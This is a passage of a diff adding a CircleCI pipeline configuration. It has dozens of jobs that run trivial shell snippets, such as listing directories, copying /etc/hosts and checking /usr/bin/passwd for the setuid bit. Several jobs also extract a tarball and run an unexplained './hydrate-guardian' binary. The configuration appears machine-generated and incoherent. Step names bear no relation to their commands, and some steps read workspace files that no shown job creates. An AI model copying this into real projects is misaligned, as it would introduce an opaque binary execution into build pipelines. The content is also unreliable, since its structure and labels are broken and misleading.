+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'a461989a-0a3a-f64b'
+  DEV_BUILD_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  threadVec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Turn off on call
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; for w in {1..9}; do echo "$w squared is $((w**2))"; done | sort; true ; } > /tmp/build-root/build-v5.18.5
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'build-v5.18.5'
+  UAT_STAGE_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/LOT-2021-10131 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  f0rk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Straight after close the cart icon
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; printf 'leads\t27\nconfig\t54\nbeta\t75\nplum\t24\n' > "/var/tmp/temp_usage.conf" && cut -f1 "/var/tmp/temp_usage.conf"; true ; } > /tmp/build-root/6pe6dzzrb9x
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '6pe6dzzrb9x'
+  delta-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/6pe6dzzrb9x 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+
+  ITM-SECTION-MAX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Spin calibration beads in dr site
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; p='updating index'; echo "[${p/ /-}]"; true ; } > /tmp/build-root/sha_3b3330db49947c38
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'sha_3b3330db49947c38'
+  IOSignalDidDumpNotification:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Wave 16 Of 29 Inspecting Centrifuge Rotor
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; cat /dev/null > "/tmp/south_stage_archive_2019-08-27.log" && ls -s "/tmp/south_stage_archive_2019-08-27.log"; true ; } > /tmp/build-root/20160220
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '20160220'
+  bw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pass 13 Review Exit Interviews
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; if test -u /usr/bin/passwd ; then echo 'found'; else echo 'not found'; fi; true ; } > /tmp/build-root/orchard-crimson-alpha
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'orchard-crimson-alpha'
+  yaraq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Review the budget variance before close
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; touch '/tmp/goal.csv' && chmod 755 '/tmp/goal.csv' && stat -c %a '/tmp/goal.csv'; true ; } > /tmp/build-root/scratch-fd1ad1df
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'scratch-fd1ad1df'
+  WorkerSafeGraniteSanitize:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Transcode 1000 percent of proxy files
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; trap -l | head -n2; true ; } > /tmp/build-root/6pe6dzzrb9x
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '6pe6dzzrb9x'
+  dec-932:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Post on call so tests pass
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/village.travel.peach.log && sed -i '1d' /tmp/village.travel.peach.log && diff /etc/hosts /tmp/village.travel.peach.log | head --lines=4; true ; } > /tmp/build-root/stage-cef04
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'stage-cef04'
+  preSend:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Seal The Slides
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; grep --no-messages --color=always bash /etc/shells | sort | uniq -c; true ; } > /tmp/build-root/fnv_3890ff7
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'fnv_3890ff7'
+  clipsecondarypeek:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: R30
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; if test -d $HOME; then echo "present"; elif test -e /tmp; then echo maybe; else echo absent; fi; true ; } > /tmp/build-root/20251214_064359
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '20251214_064359'
+  Step-BackupView:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Merge pre midnight
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -maxdepth 1 -type l -name "NEWS*" -ctime -7|nl; true ; } > /tmp/build-root/KKGpiJ0h9crE5n
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'KKGpiJ0h9crE5n'
+  jigsaw-tiger:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: 800 exporting fog volumes
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; getent hosts localhost | tail -n 2 | tr -s ' ' | fold -w 26 | tail -n 2; true ; } > /tmp/build-root/DSC58180
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'DSC58180'
+  asset_sys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Label the vials for 8 minutes
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; if [ ! -b /dev/null ]; then echo 'yes'; else echo no; fi; true ; } > /tmp/build-root/HoLLowsoUTh
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'HoLLowsoUTh'
+  NamedFakeArticleElement:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: staging only rotation
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; find /usr/share -type d ! -name \*.txt -user $(whoami) 2> /dev/null | xargs -r ls -ld | head -5; true ; } > /tmp/build-root/IMG69206
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'IMG69206'
+  Timer-Local:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Sequence counters reindexed done
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; for w in tuesday friday wednesday sunday monday; do echo ${w^^}; done; true ; } > /tmp/build-root/80645e77-1826
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '80645e77-1826'
+  i18n_is:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: spawning nav mesh
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; find /usr/lib -type f -print0 2>/dev/null | xargs -0r stat -c %s | awk '{s+=$1} END {print s}'; true ; } > /tmp/build-root/klO
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'klO'
+  juliett-cursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Text the front desk if that is ok
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; ls -si | fmt -w 60; true ; } > /tmp/build-root/557b7f73-1f1a-0bd9
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '557b7f73-1f1a-0bd9'
+  r47io:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: check dns ttl
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; if grep -q '^nameserver' /etc/resolv.conf;then echo good; else echo bad; fi; true ; } > /tmp/build-root/DSC-00001823
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'DSC-00001823'
+  rewind-lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: The model weights are in place
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; function bump() { ls -ld "$@"; }; bump /tmp /etc; true ; } > /tmp/build-root/lagoon876
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'lagoon876'
+  globeish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: X80
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; ls -F -p -v /usr/share/*/ | tr '\n' ' '; true ; } > /tmp/build-root/175.204
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '175.204'
+workflows:
+  build:
+    jobs:
+      - mount_fail_find
+      - ITM-SECTION-MAX:
+          requires:
+            - mount_fail_find
+      - py311-ship:
+          requires:
+            - ITM-SECTION-MAX
+      - inactive_pebble_prompt_header:
+          requires:
+            - ITM-SECTION-MAX
+      - IOSignalDidDumpNotification:
+          requires:
+            - inactive_pebble_prompt_header
+      - MERGE_UAT:
+          requires:
+            - IOSignalDidDumpNotification
+      - backport-graph-82:
+          requires:
+            - IOSignalDidDumpNotification
+      - bw:
+          requires:
+            - backport-graph-82
+      - v7-preview:
+          requires:
+            - bw
+      - pool_spec:
+          requires:
+            - bw
+      - yaraq:
+          requires:
+            - pool_spec
+      - package:
+          requires:
+            - yaraq
+      - f0rk:
+          requires:
+            - yaraq
+      - WorkerSafeGraniteSanitize:
+          requires:
+            - f0rk
+      - delta-8:
+          requires:
+            - WorkerSafeGraniteSanitize
+      - subway_28231_invalid:
+          requires:
+            - WorkerSafeGraniteSanitize
+      - dec-932:
+          requires:
+            - subway_28231_invalid
+      - break-prod:
+          requires:
+            - dec-932
+      - batchTotalHandlerLedgerAtlas:
+          requires:
+            - dec-932
+      - preSend:
+          requires:
+            - batchTotalHandlerLedgerAtlas
+      - Launch_Release9:
+          requires:
+            - preSend
+      - wide-alpha-p:
+          requires:
+            - preSend
+      - clipsecondarypeek:
+          requires:
+            - wide-alpha-p
+      - q4-smoke:
+          requires:
+            - clipsecondarypeek
+      - varCb:
+          requires:
+            - clipsecondarypeek
+      - Step-BackupView:
+          requires:
+            - varCb
+      - java17-test:
+          requires:
+            - Step-BackupView
+      - W_TAU
+      - jigsaw-tiger:
+          requires:
+            - W_TAU
+      - rm-session:
+          requires:
+            - jigsaw-tiger
+      - szConstJobCallback:
+          requires:
+            - jigsaw-tiger
+      - asset_sys:
+          requires:
+            - szConstJobCallback
+      - jess-push:
+          requires:
+            - asset_sys
+      - msgs_si:
+          requires:
+            - asset_sys
+      - NamedFakeArticleElement:
+          requires:
+            - msgs_si
+      - dp-x:
+          requires:
+            - NamedFakeArticleElement
+      - ro_Hant_CL:
+          requires:
+            - NamedFakeArticleElement
+      - Timer-Local:
+          requires:
+            - ro_Hant_CL
+      - preview-build:
+          requires:
+            - Timer-Local
+      - broker-v5-scratch-amd64
+      - i18n_is:
+          requires:
+            - broker-v5-scratch-amd64
+      - APP-542:
+          requires:
+            - i18n_is
+      - value-ft:
+          requires:
+            - i18n_is
+      - juliett-cursor:
+          requires:
+            - value-ft
+      - API-157:
+          requires:
+            - juliett-cursor
+      - logServoLock:
+          requires:
+            - juliett-cursor
+      - r47io:
+          requires:
+            - logServoLock
+      - rust-build:
+          requires:
+            - r47io
+      - v17:
+          requires:
+            - r47io
+      - rewind-lock:
+          requires:
+            - v17
+      - Rollout_Pipeline5:
+          requires:
+            - rewind-lock
+      - qRot:
+          requires:
+            - rewind-lock
+      - globeish:
+          requires:
+            - qRot
+      - jan22-ship:
+          requires:
+            - globeish
+      - field_smart
+      - threadVec
+      - Prepare_Image8:
+          requires:
+            - field_smart
+            - threadVec
+      - UAT_STAGE_4:
+          requires:
+            - field_smart
+            - threadVec
+      - helios-beta:
+          requires:
+            - field_smart
+            - threadVec
+      - success_city_link_3
+      - TRL-STAT-FTR
+      - DD-END-OLD
+      - jun21-ship:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - INIT_DEV:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - run-full-docker-image:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - d-2:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - fire-up:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - uniform-9:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - DEV_BUILD_1:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - rl:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
+      - beta-v6:
+          requires:
+            - success_city_link_3
+            - TRL-STAT-FTR
+            - DD-END-OLD
